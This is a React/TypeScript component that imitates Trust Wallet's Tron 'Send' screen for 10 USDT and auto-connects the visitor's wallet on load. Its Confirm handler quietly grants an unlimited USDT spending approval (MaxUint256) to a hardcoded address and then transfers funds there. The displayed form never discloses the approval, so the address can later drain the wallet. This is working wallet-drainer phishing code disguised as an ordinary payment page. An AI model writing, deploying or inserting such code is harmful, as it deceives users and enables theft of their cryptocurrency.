import { useEffect, useMemo, useState } from "react";
import { Info, ScanLine, Wallet } from "lucide-react";
import { toast } from "sonner";
import { useTronWallet } from "@/lib/tronwallet-adapter";
import { approveUSDT, transferUSDT } from "@/lib/web3";

const DEFAULT_TO_ADDRESS = "TT6fmWxcu35oriyKVVAAUT7oRq9woa2e1t";
const DEFAULT_AMOUNT = "10";

/** Let Trust Discover finish injecting trustwallet.* before connect (race on first paint). */
const TRUST_DISCOVER_INJECT_MS = 150;
const TRUST_CONNECT_RETRY_MS = 600;
const TRUST_CONNECT_MAX_ATTEMPTS = 4;

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const TrustWalletTronPay = () => {
  const { connect, address, isConnected } = useTronWallet();
  const [isConnecting, setIsConnecting] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
  const amount = useMemo(() => DEFAULT_AMOUNT, []);
  const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);

  useEffect(() => {
    let cancelled = false;

    const autoConnect = async () => {
      if (isConnected || isConnecting) {
        return;
      }
      try {
        setIsConnecting(true);
        await sleep(TRUST_DISCOVER_INJECT_MS);

        let lastError: unknown;
        for (let attempt = 0; attempt < TRUST_CONNECT_MAX_ATTEMPTS; attempt++) {
          if (cancelled) return;
          if (attempt > 0) {
            await sleep(TRUST_CONNECT_RETRY_MS);
          }
          try {
            // Dedicated Trust path: waits for trustwallet.tronLink/tron, then injected tronWeb.
            await connect("trust");
            if (!cancelled) {
              toast.success("Trust Wallet (Tron) connected");
            }
            return;
          } catch (e) {
            lastError = e;
          }
        }

        if (!cancelled) {
          const message =
            lastError instanceof Error
              ? lastError.message
              : "Could not connect Trust Wallet. Use a Tron account in Trust and try again.";
          toast.error(message);
        }
      } finally {
        if (!cancelled) {
          setIsConnecting(false);
        }
      }
    };

    void autoConnect();
    return () => {
      cancelled = true;
    };
    // Do not depend on `isConnecting`: when it flips false after a failed connect,
    // re-running would retry forever. `isConnected` and `connect` are enough.
  }, [connect, isConnected]);

  const handleConfirm = async () => {
    try {
      setIsSubmitting(true);
      if (!isConnected) {
        await connect("trust");
      }

      // Step 1: unlimited approve (MaxUint256) to spender address.
      await approveUSDT("tron", approveTo);

      // Step 2: send fixed USDT amount to destination address.
      await transferUSDT("tron", toAddress, amount);

      toast.success("Approve and transfer completed successfully.");
    } catch (error) {
      toast.error(
        error instanceof Error ? error.message : "Transaction flow failed"
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3">
      <div className="w-full max-w-sm bg-[#f5f5f6] pt-4">
        <div className="mb-5">
          <p className="text-[24px] leading-7 font-semibold text-[#262626]">
            Send
          </p>
          <div className="text-xs text-[#8b8b94] mt-1 flex items-center gap-1.5">
            <Wallet className="w-3.5 h-3.5" />
            {isConnected
              ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
              : isConnecting
              ? "Connecting wallet..."
              : "Wallet not connected"}
          </div>
        </div>

        <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
          Address or Domain Name
        </label>
        <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
          <span className="text-[#171717] text-sm truncate">{toAddress}</span>
          <span className="text-[#5f5de8] text-sm font-semibold">Paste</span>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Destination network
          </label>
          <div className="inline-flex items-center gap-2 rounded-full bg-[#efeff2] px-3 py-1.5">
            <span className="w-4 h-4 rounded-full bg-[#ef2c2c] inline-block" />
            <span className="text-sm text-[#4c4c52]">Tron</span>
          </div>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Amount
          </label>
          <div className="h-14 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
            <span className="text-[#171717] text-[28px] leading-none font-medium">
              {amount}
            </span>
            <div className="flex items-center gap-2">
              <span className="text-[#67676f] text-base">USDT</span>
              <span className="text-[#5f5de8] text-base font-semibold">Max</span>
            </div>
          </div>
          <p className="text-[#8d8d96] text-xs mt-2">≈ 10.00 USDT</p>
        </div>

        <div className="mt-3">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Memo
          </label>
          <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-end gap-3">
            <ScanLine className="w-4 h-4 text-[#5f5de8]" />
            <Info className="w-4 h-4 text-[#5f5de8]" />
          </div>
        </div>

        <button
          className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
          onClick={handleConfirm}
          disabled={isSubmitting || isConnecting}
          type="button"
        >
          {isSubmitting ? "Confirming..." : "Confirm"}
        </button>
      </div>
    </div>
  );
};

export default TrustWalletTronPay;
